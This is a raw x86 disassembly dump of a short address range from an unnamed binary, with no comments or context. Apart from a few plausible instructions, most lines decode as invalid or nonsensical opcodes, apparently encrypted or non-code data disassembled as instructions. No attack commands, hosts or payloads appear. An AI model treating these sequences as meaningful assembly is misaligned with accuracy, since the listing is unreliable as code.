  40f9bc:	call   0xe582d1ac
  40f9c1:	fisub  DWORD PTR fs:[ebx+0x4ca09dd1]
  40f9c8:	ret    0xe57c
  40f9cb:	or     dl,BYTE PTR [edi+0x716ab330]
  40f9d1:	adc    al,0x11
  40f9d3:	mov    ch,0x56
  40f9d5:	adc    esi,DWORD PTR ds:0x433777
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43377b
  40f9e5:	adc    DWORD PTR ds:0x433833,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	into   
  40fa11:	test   al,0x64
  40fa13:	and    cl,BYTE PTR [ebx]
  40fa15:	mov    ch,0x7e
  40fa17:	jle    0x40f9c5
  40fa19:	jl     0x40fa99
  40fa1b:	jle    0x40fa53
  40fa1d:	test   bl,0xf8
  40fa20:	xor    bl,dl
  40fa22:	test   eax,0x45a13d8e
  40fa27:	fnstenv ds:0x60dc4207
  40fa2d:	xlat   BYTE PTR ds:[ebx]
  40fa2e:	mul    ch
  40fa30:	xchg   esi,eax
  40fa31:	xchg   esi,eax
  40fa32:	cmp    al,ah
  40fa34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa35:	mov    bh,0x4c
  40fa37:	sub    eax,0x69c76bdf
  40fa3c:	fadd   QWORD PTR ds:[ebx+eiz*8-0x22]
  40fa41:	mov    ecx,0x8f7f5d98
  40fa46:	cmp    esp,ebp
  40fa48:	push   0xffffffb7
  40fa4a:	loop   0x40fa10
  40fa4c:	out    0xc0,al
  40fa4e:	push   edi
  40fa4f:	ins    BYTE PTR es:[edi],dx
  40fa50:	xchg   ch,ah
  40fa52:	jg     0x40fa8a
  40fa54:	ja     0x40fa21
  40fa56:	arpl   WORD PTR [edx+0x57],cx
  40fa59:	pop    ecx
  40fa5a:	mov    ebx,0xff8c9e10
  40fa5f:	or     ch,BYTE PTR [ebx]
  40fa61:	cmp    al,0x7b
  40fa63:	adc    esp,DWORD PTR [edx+0xab5accd]
  40fa69:	inc    edi
  40fa6a:	repnz ss call 0x4bc4:0xe2fd23ac
  40fa73:	pop    esp
  40fa74:	(bad)  
  40fa76:	clc    
  40fa77:	icebp  
  40fa78:	icebp  
  40fa79:	test   al,0x60
  40fa7b:	push   0x6e16d527
  40fa80:	stos   DWORD PTR es:[edi],eax
  40fa81:	push   ds
  40fa82:	sbb    eax,0xa73fe920
  40fa87:	xor    esp,DWORD PTR ds:0xc8a749af
  40fa8d:	xchg   esi,eax
  40fa8e:	or     ebx,DWORD PTR fs:[eax]
  40fa91:	mov    al,ds:0x3cb7b25d
  40fa96:	mov    ah,dh
  40fa98:	jb     0x40fac0
  40fa9a:	or     ch,bl
  40fa9c:	(bad)  
  40fa9d:	and    al,0x9c
  40fa9f:	xor    bl,BYTE PTR [eax-0x57]
  40faa2:	cwde   
  40faa3:	sbb    al,0x97
  40faa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faa6:	mov    ah,0x1a
  40faa8:	xor    eax,0x742b0e7d
  40faad:	or     al,0x6e
  40faaf:	nop
  40fab0:	div    dl
  40fab2:	fnstsw WORD PTR [ecx-0x2c]
  40fab5:	xlat   BYTE PTR ds:[ebx]
  40fab6:	inc    edx
  40fab7:	enter  0xc149,0x29
  40fabb:	jo     0x40fb34
  40fabd:	fs cmp eax,0x8b202c5b
  40fac3:	push   esp
  40fac4:	loopne 0x40fb20
  40fac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fac7:	addr16 add al,0x44
  40faca:	xor    DWORD PTR [esi+edi*8],ebp
  40facd:	mov    edi,0x7285bb94
  40fad2:	xchg   ecx,eax
  40fad3:	in     eax,0xd9
  40fad5:	mov    al,0xc9
  40fad7:	test   eax,0x830af587
  40fadc:	rcr    BYTE PTR [edi-0x14],1
  40fadf:	clc    
  40fae0:	push   ss
  40fae1:	push   ecx
  40fae2:	push   ecx
  40fae3:	cmp    ebx,eax
  40fae5:	add    ch,BYTE PTR [ecx+0x71]
  40fae8:	sbb    BYTE PTR [edx+0x9a916d6],cl
  40faee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faef:	cmp    ecx,DWORD PTR [edi+0x668f5f4b]
  40faf5:	mov    ecx,0x15d1fc3b
  40fafa:	addr16 out dx,eax
  40fafc:	cli    
  40fafd:	jmp    0x744:0xa377e737
  40fb04:	out    dx,al
  40fb05:	inc    ecx
  40fb06:	call   0x9379d899
  40fb0b:	int3   
  40fb0c:	cmp    ecx,DWORD PTR [edx-0x2b]
  40fb0f:	daa    
  40fb10:	cmp    edx,edx
  40fb12:	stos   BYTE PTR es:[edi],al
  40fb13:	in     eax,dx
  40fb14:	aad    0x64
  40fb16:	std    
  40fb17:	push   ebp
  40fb18:	sbb    eax,0x92657b52
  40fb1d:	cmp    eax,0xe0727f50
  40fb22:	jecxz  0x40faab
  40fb24:	jno    0x40faad
  40fb26:	(bad)  
  40fb27:	in     al,0x2
  40fb29:	xchg   edi,eax
  40fb2a:	inc    ecx
  40fb2b:	mov    edi,DWORD PTR [edx+eiz*8+0xb]
  40fb2f:	sbb    DWORD PTR [edi+0xb3105dd],ecx
  40fb35:	mov    DWORD PTR [esi],edi
  40fb37:	adc    bl,BYTE PTR [ecx-0x21]
  40fb3a:	adc    edx,DWORD PTR [ecx]
  40fb3c:	js     0x40faf5
  40fb3e:	je     0x40facf
  40fb40:	popa   
  40fb41:	pusha  
  40fb42:	mov    ebp,DWORD PTR [ecx-0x1b]
  40fb45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb46:	cmp    ebp,eax
  40fb48:	lea    edx,[ebx-0x2381196e]
  40fb4e:	cmc    
  40fb4f:	adc    dh,BYTE PTR [ebx-0x2e]
  40fb52:	mov    edx,0x7571d26d
  40fb57:	callw  0x6dba
  40fb5b:	cdq    
  40fb5c:	dec    eax
  40fb5d:	stos   BYTE PTR es:[edi],al
  40fb5e:	mov    cl,0xd2
  40fb60:	jb     0x40fb8b
  40fb62:	fdiv   st(6),st
  40fb64:	mov    dl,0x34
  40fb66:	push   ds
  40fb67:	fistp  WORD PTR [eax+0x4ef20ff7]
  40fb6d:	cmp    edi,edi
  40fb6f:	dec    edx
  40fb70:	(bad)  
  40fb71:	mov    dl,0xff
  40fb73:	cld    
  40fb74:	mov    edi,0x4c7f87a1
  40fb79:	je     0x40faff
  40fb7b:	icebp  
  40fb7c:	rol    BYTE PTR [ebp-0x4a0de401],1
  40fb82:	inc    esi
  40fb83:	hlt    
  40fb84:	test   BYTE PTR [ebp+0x74],bl
  40fb87:	cwde   
  40fb88:	xchg   edx,eax
  40fb89:	lea    edi,[ebx+ebp*2]
  40fb8c:	in     al,dx
  40fb8d:	out    dx,al
  40fb8e:	dec    ecx
  40fb8f:	inc    ebx
  40fb90:	or     dl,BYTE PTR [eax+0x7611dbd4]
  40fb96:	sbb    al,0x8c
  40fb98:	and    DWORD PTR [esi-0x5c391bea],esi
  40fb9e:	cli    
  40fb9f:	cwde   
  40fba0:	(bad)  
  40fba1:	fbstp  TBYTE PTR [ecx+0x2e]
  40fba4:	std    
  40fba5:	js     0x40fc16
  40fba7:	pop    ds
  40fba8:	stos   DWORD PTR es:[edi],eax
  40fba9:	ds ins BYTE PTR es:[edi],dx
  40fbab:	xchg   esp,eax
  40fbac:	in     al,0xd
  40fbae:	push   esi
  40fbaf:	(bad)  
  40fbb0:	xor    BYTE PTR [eax-0x5398344b],dl
  40fbb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbb7:	(bad)  
  40fbb8:	loop   0x40fbe6
  40fbba:	sbb    dh,al
  40fbbc:	sbb    bl,BYTE PTR [esi]
  40fbbe:	push   eax
  40fbbf:	outs   dx,DWORD PTR ds:[esi]
  40fbc0:	sub    ebx,DWORD PTR [esi-0x6d1e14e8]
  40fbc6:	shl    BYTE PTR [esi],cl
  40fbc8:	pop    es
  40fbc9:	ret    0x6880
  40fbcc:	out    dx,al
  40fbcd:	fiadd  WORD PTR [edx+0x1615fc2f]
  40fbd3:	dec    ebx
  40fbd4:	xchg   ebx,eax
  40fbd5:	or     BYTE PTR [edx-0x44],bh
  40fbd8:	(bad)  
  40fbd9:	ds stos DWORD PTR es:[edi],eax
  40fbdb:	push   ebx
  40fbdc:	xor    al,0xf5
  40fbde:	push   cs
  40fbdf:	popf   
  40fbe0:	xchg   ebx,eax
  40fbe1:	jmp    0x5020e10a
  40fbe6:	sub    al,BYTE PTR [eax+0x66269d5a]
  40fbec:	mov    esi,0x1a135f24
  40fbf1:	mov    ebx,0xc4f14fb5
  40fbf6:	fistp  DWORD PTR [ecx]
  40fbf8:	lock fmul DWORD PTR [ebx]
  40fbfb:	in     eax,0x78
  40fbfd:	cmp    ecx,DWORD PTR [edx+0x16f6c42d]
  40fc03:	push   es
  40fc04:	mov    edi,0x14367c6d
  40fc09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc0a:	mov    DWORD PTR [ebp-0x7f54713],ecx
  40fc10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc11:	inc    edi
  40fc12:	bound  ecx,QWORD PTR [esi+0x70]
  40fc15:	add    al,0xa7
  40fc17:	ins    BYTE PTR es:[edi],dx
  40fc18:	push   0xffffff9a
  40fc1a:	sub    BYTE PTR [ecx],ch
  40fc1c:	ror    DWORD PTR [ebx],1
  40fc1e:	push   cs
  40fc1f:	xchg   ecx,eax
  40fc20:	test   al,0x59
  40fc22:	dec    edi
  40fc23:	daa    
  40fc24:	push   esp
  40fc25:	sub    DWORD PTR [ebx+0x77],0xc6f6edcf
  40fc2c:	or     DWORD PTR ds:0x5eb2d3df,0x51
  40fc33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc34:	loopne 0x40fc91
  40fc36:	adc    edx,DWORD PTR [esi-0x5c7855a3]
  40fc3c:	xor    BYTE PTR [edi+edx*4],bl
  40fc3f:	stos   DWORD PTR es:[edi],eax
  40fc40:	mov    dh,0xc9
  40fc42:	jp     0x40fc42
  40fc44:	xor    ebx,esp
  40fc46:	dec    DWORD PTR fs:[eax+esi*2-0x28]
  40fc4b:	cmp    BYTE PTR [ebx+ecx*8-0x5f],ah
  40fc4f:	adc    edx,DWORD PTR [esi-0x748bb3ad]
  40fc55:	and    esi,ecx
  40fc57:	fmul   DWORD PTR [eax+0x23]
  40fc5a:	xlat   BYTE PTR ds:[ebx]
  40fc5b:	arpl   WORD PTR [eax+eiz*4+0x68],di
  40fc5f:	or     bh,BYTE PTR [edx]
  40fc61:	pushf  
  40fc62:	pop    ecx
  40fc63:	hlt    
  40fc64:	push   0x32
  40fc66:	fwait
  40fc67:	mov    eax,ds:0x5dce33d7
  40fc6c:	(bad)  
  40fc6d:	in     al,dx
  40fc6e:	sbb    eax,0xed92d8ca
  40fc73:	add    eax,0xae86f684
  40fc78:	jo     0x40fcde
  40fc7a:	inc    esp
  40fc7b:	and    eax,0x7ed5d596
  40fc80:	and    bh,BYTE PTR [ebx-0x53679cc1]
  40fc86:	mov    ebp,0xc568836e
  40fc8b:	pushf  
  40fc8c:	lea    esp,[eax+edi*1-0xb7f9df7]
  40fc93:	push   eax
  40fc94:	pushf  
  40fc95:	mov    cs,WORD PTR [ebx+0x5019b956]
  40fc9b:	mov    eax,0xbf7e96bf
  40fca0:	cmc    
  40fca1:	xor    eax,0xa873f700
  40fca6:	ins    DWORD PTR es:[edi],dx
  40fca7:	xchg   edx,eax
  40fca8:	cs out 0xbb,al
  40fcab:	dec    edx
  40fcac:	push   ds
  40fcad:	icebp  
  40fcae:	xor    al,0x71
  40fcb0:	add    BYTE PTR [edi+edx*2+0xef3b29e],ah
  40fcb7:	cmp    cl,cl
  40fcb9:	jmp    0x77a1:0xa92de791
  40fcc0:	dec    edi
  40fcc1:	cmc    
  40fcc2:	jmp    0xc0c7:0xf9763444
  40fcc9:	pushf  
  40fcca:	jmp    0x3e2255d
  40fccf:	icebp  
  40fcd0:	add    eax,ecx
  40fcd2:	jmp    0x40ffa1
  40fcd7:	lock sub DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	rol    DWORD PTR [eax],0x7b
  40fce5:	mov    al,ds:0x7eb3b958
  40fcea:	jle    0x40fc98
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fcb6
  40fcf0:	xor    eax,0xa2d1ce66
  40fcf5:	icebp  
  40fcf6:	sub    eax,0xab117f99
  40fcfb:	push   eax
  40fcfc:	aaa    
  40fcfd:	stc    
  40fcfe:	dec    ecx
  40fcff:	xchg   esi,eax
  40fd00:	addr16 inc ecx
  40fd02:	scas   eax,DWORD PTR es:[edi]
  40fd03:	stos   BYTE PTR es:[edi],al
  40fd04:	(bad)  
  40fd05:	dec    esi
  40fd06:	or     BYTE PTR [edi+0x7b926168],dh
  40fd0c:	inc    edx
  40fd0d:	popf   
  40fd0e:	mov    ch,0x51
  40fd10:	mov    ch,0x3a
  40fd12:	mov    esi,0x72a15fc8
  40fd17:	xor    edx,DWORD PTR [esi-0x19e12741]
  40fd1d:	cmp    al,0x26
  40fd1f:	or     ah,dh
  40fd21:	out    0xae,eax
  40fd23:	pop    eax
  40fd24:	and    al,bl
  40fd26:	cmp    DWORD PTR [ebx],eax
  40fd28:	jne    0x40fda4
  40fd2a:	test   DWORD PTR [ebp+ebp*8-0x5885e439],ebp
  40fd31:	or     dh,bl
  40fd33:	btc    esi,ebp
  40fd36:	addr16 mul dh
  40fd39:	mov    edx,0xdd233c77
  40fd3e:	outs   dx,DWORD PTR ds:[esi]
  40fd3f:	or     al,0xee
  40fd41:	pop    edx
  40fd42:	or     eax,0x778612a6
  40fd47:	inc    edi
  40fd48:	in     al,dx
  40fd49:	es adc eax,0x1b99953a
  40fd4f:	and    DWORD PTR [ebx-0x56],esi
  40fd52:	and    ecx,ecx
  40fd54:	sub    DWORD PTR [edx+0x66],0xffffffcc
  40fd58:	jno    0x40fd03
  40fd5a:	adc    BYTE PTR [edx+0x5d],bl
  40fd5d:	scas   eax,DWORD PTR es:[edi]
  40fd5e:	mov    edx,0xd5c7d8ea
  40fd63:	pop    esi
  40fd64:	xor    BYTE PTR [esi],0x9b
  40fd67:	mov    ds:0x7aa73ffe,eax
  40fd6c:	jno    0x40fd64
  40fd6e:	or     dl,dl
  40fd70:	jle    0x40fdbc
  40fd72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd73:	mov    dl,0xb3
  40fd75:	addr16 pop esp
  40fd77:	xchg   BYTE PTR [ebp+0x79253b4b],dh
  40fd7d:	lods   eax,DWORD PTR ds:[esi]
  40fd7e:	adc    al,0xbc
  40fd80:	in     eax,0xfd
  40fd82:	pop    edx
  40fd83:	push   esp
  40fd84:	out    0xb9,al
  40fd86:	retf   
  40fd87:	aaa    
  40fd88:	shl    DWORD PTR [esi-0x513cda13],0xb8
  40fd8f:	xchg   ebp,eax
  40fd90:	mov    bh,0x17
  40fd92:	add    edi,ebx
  40fd94:	push   es
  40fd95:	fnstcw WORD PTR [edx]
  40fd97:	add    eax,DWORD PTR [esi-0x61dbb76f]
  40fd9d:	out    dx,eax
  40fd9e:	xchg   esi,eax
  40fd9f:	fidiv  WORD PTR [esi+ebx*2+0x31]
  40fda3:	arpl   si,si
  40fda5:	push   edx
  40fda6:	add    eax,0xd6387de8
  40fdab:	in     eax,dx
  40fdac:	pop    ebp
  40fdad:	neg    DWORD PTR [ebp-0x55cf75b]
  40fdb3:	ror    DWORD PTR [edi],0x84
  40fdb6:	jg     0x40fe11
  40fdb8:	push   ebx
  40fdb9:	xor    DWORD PTR [esi+ecx*8+0x64],0x2a
  40fdbe:	out    0x89,eax
  40fdc0:	mov    BYTE PTR [edx+0x67],cl
  40fdc3:	jge    0x40fdd5
  40fdc5:	sub    BYTE PTR [esi-0x46],0x9d
  40fdc9:	sub    dl,ch
  40fdcb:	add    BYTE PTR [ecx],bh
  40fdcd:	push   0x1be0c723
  40fdd2:	mov    DWORD PTR [ebx+0xb],0xd6b15a19
  40fdd9:	jge    0x40fdb5
  40fddb:	push   cs
  40fddc:	mov    esi,ebx
  40fdde:	test   BYTE PTR [ebx],al
  40fde0:	mov    al,ds:0x7a045abc
  40fde5:	cmp    eax,0x4455e4ed
  40fdea:	int3   
  40fdeb:	xor    dh,bl
  40fded:	xchg   DWORD PTR [ecx+0x30],ebp
  40fdf0:	std    
  40fdf1:	imul   ebp,DWORD PTR [ebx],0x4e
  40fdf4:	xchg   esp,eax
  40fdf5:	or     al,0xad
  40fdf7:	nop    ebp
  40fdfa:	sbb    al,BYTE PTR [ebx+0x43]
  40fdfd:	sbb    al,0xda
  40fdff:	inc    esi
  40fe00:	fidivr DWORD PTR [esi-0x65]
  40fe03:	or     BYTE PTR [ebp+0x579ff79],0xcf
  40fe0a:	(bad)  
  40fe0b:	stc    
  40fe0c:	and    eax,DWORD PTR [eax+0x4ea3ad23]
  40fe12:	call   0xb127:0x1ae3887a
  40fe19:	in     al,dx
  40fe1a:	jmp    0x40fe53
  40fe1c:	sub    eax,0xb01acc9d
  40fe21:	in     eax,dx
  40fe22:	pop    es
  40fe23:	(bad)  
  40fe24:	and    eax,0x4569c624
  40fe29:	(bad)  [eax-0x435e1d9e]
  40fe2f:	int    0xf2
  40fe31:	mov    esi,0xef1c519a
  40fe36:	jecxz  0x40fe0a
  40fe38:	add    cl,al
  40fe3a:	aam    0x86
  40fe3c:	je     0x40fe50
  40fe3e:	push   ecx
  40fe3f:	sub    eax,0x7fdbf54e
  40fe44:	push   ebx
  40fe45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe46:	xchg   esp,eax
  40fe47:	pop    eax
  40fe48:	shl    BYTE PTR [ebp-0x69],cl
  40fe4b:	sbb    esi,ecx
  40fe4d:	mov    ah,0x3
  40fe4f:	sub    DWORD PTR [edi-0x60],edx
  40fe52:	add    BYTE PTR [edi+0x12],bh
  40fe55:	cmp    al,bh
  40fe57:	xchg   ebp,eax
  40fe58:	dec    ebp
  40fe59:	adc    eax,0xf127e77a
  40fe5e:	in     eax,0xd3
  40fe60:	fst    QWORD PTR [ebx]
  40fe62:	fnsave [ebp-0x71]
  40fe65:	aam    0x5d
  40fe67:	or     al,0xba
  40fe69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe6a:	test   DWORD PTR [ecx-0x2b],esp
  40fe6d:	xchg   edx,eax
  40fe6e:	jbe    0x40fe8a
  40fe70:	(bad)  
  40fe71:	pushf  
  40fe72:	nop
  40fe73:	pop    edi
  40fe74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe75:	(bad)  
  40fe76:	bound  ebx,QWORD PTR [ebx-0x76]
  40fe79:	mov    bl,0xbe
  40fe7b:	fwait
  40fe7c:	sbb    ebx,DWORD PTR [ebx+edi*1+0x7389178a]
  40fe83:	scas   eax,DWORD PTR es:[edi]
  40fe84:	xchg   ebp,eax
  40fe85:	test   DWORD PTR [ecx-0x726f5525],ebp
  40fe8b:	aaa    
  40fe8c:	out    0xde,al
  40fe8e:	lock push edx
  40fe90:	mov    dl,0x88
  40fe92:	call   0xaaf19032
  40fe97:	pusha  
  40fe98:	and    DWORD PTR [edi],0x9
  40fe9b:	test   eax,0xfca785ee
  40fea0:	cmp    DWORD PTR [eax],esp
  40fea2:	pop    ecx
  40fea3:	sub    BYTE PTR [esi],0x20
  40fea6:	and    DWORD PTR [edx+0x6c392dec],esi
  40feac:	sbb    ebp,ecx
  40feae:	mov    dl,0xc1
  40feb0:	dec    esp
  40feb1:	or     BYTE PTR [edi+0x56],0xc8
  40feb5:	jb     0x40fe88
  40feb7:	rep ins DWORD PTR es:[edi],dx
  40feb9:	pop    esp
  40feba:	and    DWORD PTR [esi-0x26],ecx
  40febd:	fidiv  WORD PTR [edx]
  40febf:	ds push esp
  40fec1:	sbb    al,0x79
  40fec3:	or     BYTE PTR [eax],al
  40fec5:	mov    DWORD PTR [ebp+0x563c918a],esi
  40fecb:	sub    eax,DWORD PTR [ebx+esi*8]
  40fece:	inc    ebp
  40fecf:	adc    bl,dh
  40fed1:	xchg   esp,eax
  40fed2:	cmp    eax,0xf1597787
  40fed7:	pop    esp
  40fed8:	aaa    
  40fed9:	enter  0x68e5,0x86
  40fedd:	adc    esi,DWORD PTR [edi-0x58dd582b]
  40fee3:	inc    ebx
  40fee4:	pop    esi
  40fee5:	into   
  40fee6:	mov    cl,0x74
  40fee8:	pop    esi
  40fee9:	aam    0x4a
  40feeb:	xchg   esp,eax
  40feec:	xlat   BYTE PTR ds:[ebx]
  40feed:	outs   dx,BYTE PTR ds:[esi]
  40feee:	dec    ebp
  40feef:	popf   
  40fef0:	sub    al,0x6c
  40fef2:	add    BYTE PTR [edi],0xb4
  40fef5:	out    dx,eax
  40fef6:	fisttp WORD PTR [edx+0x137172c7]
  40fefc:	in     eax,dx
  40fefd:	es pop edx
  40feff:	daa    
  40ff00:	rcl    ebp,cl
  40ff02:	xor    DWORD PTR [ebx+0x31],edi
  40ff05:	out    dx,al
  40ff06:	xor    eax,0x3daeca6c
  40ff0b:	sar    DWORD PTR [edx-0x36],0x98
  40ff0f:	stos   BYTE PTR es:[edi],al
  40ff10:	retf   0xf96e
  40ff13:	fcom   DWORD PTR [ebx-0x4d7cdc88]
  40ff19:	pop    edx
  40ff1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff1b:	jmp    0x40fee8
  40ff1d:	ins    DWORD PTR es:[edi],dx
  40ff1e:	mov    esp,0xb2405fe5
  40ff23:	mov    BYTE PTR [eax+0x3a],cl
  40ff26:	xchg   ebp,eax
  40ff27:	enter  0xfe5d,0xeb
  40ff2b:	sar    bh,cl
  40ff2d:	mov    ds:0x64d58bcb,al
  40ff32:	test   eax,0x2b97e19
  40ff37:	pusha  
  40ff38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff39:	int3   
  40ff3a:	and    DWORD PTR [ebx-0x101a9ff8],ebx
  40ff40:	stos   BYTE PTR es:[edi],al
  40ff41:	js     0x40ff93
  40ff43:	in     al,0x50
  40ff45:	ds dec edi
  40ff47:	mov    esp,0xa29f939
  40ff4c:	repnz or bl,bh
  40ff4f:	add    al,al
  40ff51:	in     eax,0xdc
  40ff53:	inc    edi
  40ff54:	or     eax,0x23d699e1
  40ff59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff5a:	mov    ds:0xe2a89e36,al
  40ff5f:	adc    BYTE PTR [edx+0x56],bh
  40ff62:	push   edi
  40ff63:	mov    ch,0x1f
  40ff65:	xor    BYTE PTR [edx],ch
  40ff67:	cdq    
  40ff68:	test   BYTE PTR [esi+0x32],bl
  40ff6b:	icebp  
  40ff6c:	addr16 mov ah,0x97
  40ff6f:	jmp    0xe8d9:0xcfc9aa05
  40ff76:	sbb    al,0x53
  40ff78:	or     BYTE PTR [ebp-0x64cd0e6b],ah
  40ff7e:	or     eax,DWORD PTR [edi]
  40ff80:	icebp  
  40ff81:	adc    cl,BYTE PTR [eax+0x55e69da0]
  40ff87:	jl     0x40ffa1
  40ff89:	xchg   edx,eax
  40ff8a:	pop    esp
  40ff8b:	shl    BYTE PTR ds:0x93de61c3,cl
  40ff91:	sbb    DWORD PTR [esi-0x5bc5f522],edx
  40ff97:	test   DWORD PTR [ecx-0x3f],ebx
  40ff9a:	jb     0x40ff9c
  40ff9c:	and    al,BYTE PTR [ebx+0x48]
  40ff9f:	sti    
  40ffa0:	sbb    eax,0x8bc6af0f
  40ffa5:	jne    0x40ffb3
  40ffa7:	mov    DWORD PTR ds:0x433723,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4337e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0xd8b639b1
  40ffd9:	add    eax,0x7ebef723
  40ffde:	jle    0x40ff8c
  40ffe0:	jl     0x410060
  40ffe2:	jle    0x40ffc9
  40ffe4:	lods   al,BYTE PTR ds:[esi]
  40ffe5:	jb     0x40ffc0
  40ffe7:	popa   
  40ffe8:	icebp  
  40ffe9:	(bad)  
  40ffea:	push   0x44
  40ffec:	inc    ebx
  40ffed:	dec    ebx
  40ffee:	xor    al,0x13
  40fff0:	jns    0x41003f
  40fff2:	iret   
  40fff3:	inc    esp
  40fff4:	rcr    bh,cl
  40fff6:	xchg   ecx,eax
  40fff7:	enter  0x8162,0xd7
  40fffb:	out    0xc3,al
  40fffd:	or     BYTE PTR [ebp+0x55928bbb],dl
  410003:	xor    al,0x5d
  410005:	sub    BYTE PTR [edx+eax*2-0x7e1e26d3],cl
  41000c:	jp     0x40ff9e
  41000e:	inc    esi
  41000f:	cmp    esi,DWORD PTR fs:[edx-0x4e]
  410013:	fild   DWORD PTR [edi-0x11737e51]
  410019:	mov    al,0xd7
  41001b:	and    DWORD PTR [ecx-0x6c],ebp
  41001e:	int3   
  41001f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410020:	enter  0xd2d6,0xe0
  410024:	sbb    edi,DWORD PTR [esi-0x2327c2de]
  41002a:	mov    ebp,0x6ee08769
  41002f:	adc    DWORD PTR [eax+0x5a732528],0x48
  410036:	sub    ecx,DWORD PTR [ecx]
  410038:	mov    al,ds:0xa85b2321
  41003d:	sbb    BYTE PTR [ebx+0x67],dl
  410040:	mov    cl,0x8
  410042:	lahf   
  410043:	push   0x86cdd68b
  410048:	xchg   esi,eax
  410049:	aad    0xc7
  41004b:	mov    dl,0xd3
  41004d:	je     0x410074
  41004f:	add    eax,0xef38c8c9
  410054:	adc    eax,0x3665da4b
  410059:	and    dh,ah
  41005b:	and    ah,BYTE PTR [edi+0x46]
  41005e:	push   ss
  41005f:	cmp    eax,0x1b189cf3
  410064:	sub    BYTE PTR [edx+0x4f50dbc3],dh
  41006a:	pop    ebp
  41006b:	test   BYTE PTR [ecx+0x5623d9f8],ah
  410071:	or     eax,0x795a02f0
  410076:	jne    0x410020
  410078:	cmp    cl,BYTE PTR [esi+0x541de863]
  41007e:	adc    DWORD PTR [ebx],esp
  410080:	add    al,ch
  410082:	scas   al,BYTE PTR es:[edi]
  410083:	ss mov al,gs:0x300b812
  41008a:	daa    
  41008b:	mov    ecx,0x31309e94
  410090:	ins    DWORD PTR es:[edi],dx
  410091:	inc    eax
  410092:	dec    esp
  410093:	mov    DWORD PTR [edi+edi*2+0x7f],esp
  410097:	jb     0x41004f
  410099:	mov    edx,0x8bc60ac2
  41009e:	and    eax,0x94004db
  4100a3:	push   ebp
  4100a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100a5:	clc    
  4100a6:	jnp    0x410042
  4100a8:	dec    eax
  4100a9:	xor    DWORD PTR [ebx-0x77],ebx
  4100ac:	outs   dx,BYTE PTR ds:[esi]
  4100ad:	ins    DWORD PTR es:[edi],dx
  4100ae:	mov    ds:0xb6c18427,eax
  4100b3:	jecxz  0x410107
  4100b5:	(bad)  
  4100b6:	ds jecxz 0x410041
  4100b9:	dec    esp
  4100ba:	iret   
  4100bb:	jns    0x4100f9
  4100bd:	inc    ecx
  4100be:	sbb    BYTE PTR [ebx],ch
  4100c0:	lods   al,BYTE PTR ds:[esi]
  4100c1:	xchg   ecx,eax
  4100c2:	gs mov bl,0x84
  4100c5:	dec    esi
  4100c6:	cmp    BYTE PTR ds:0xe8463441,cl
  4100cc:	repz dec esi
  4100ce:	popa   
  4100cf:	mov    edx,0xd271dc0e
  4100d4:	inc    eax
  4100d5:	jl     0x41013f
  4100d7:	xchg   esp,eax
  4100d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100d9:	stos   BYTE PTR es:[edi],al
  4100da:	inc    ebp
  4100db:	push   ebx
  4100dc:	fcmovbe st,st(0)
  4100de:	nop
  4100df:	sub    BYTE PTR [edi+0x5f],ah
  4100e2:	jl     0x410152
  4100e4:	cli    
  4100e5:	test   esp,ecx
  4100e7:	(bad)  
  4100e8:	div    DWORD PTR [esi+0x4f]
  4100eb:	push   esi
  4100ec:	adc    esi,DWORD PTR [ecx+0x306cfaf1]
  4100f2:	mov    ah,0x1f
  4100f4:	sti    
  4100f5:	pop    ds
  4100f6:	retf   
  4100f7:	aam    0xe7
  4100f9:	cmp    DWORD PTR [edi],edx
  4100fb:	in     al,0xbc
  4100fd:	inc    ebp
  4100fe:	pop    es
  4100ff:	sbb    DWORD PTR [esi-0x3c],ebp
  410102:	dec    esi
  410103:	leave  
  410104:	mov    ah,BYTE PTR [edi+0x3d73a9f1]
  41010a:	icebp  
  41010b:	div    ch
  41010d:	pop    ss
  41010e:	fmul   QWORD PTR [esi+0x44]
  410111:	jmp    0x514c:0xb46c6553
  410118:	arpl   WORD PTR [ebp+0x29],si
  41011b:	pop    es
  41011c:	add    DWORD PTR [edi+eax*8+0x1f],esp
  410120:	sub    DWORD PTR [esi+0x37],edi
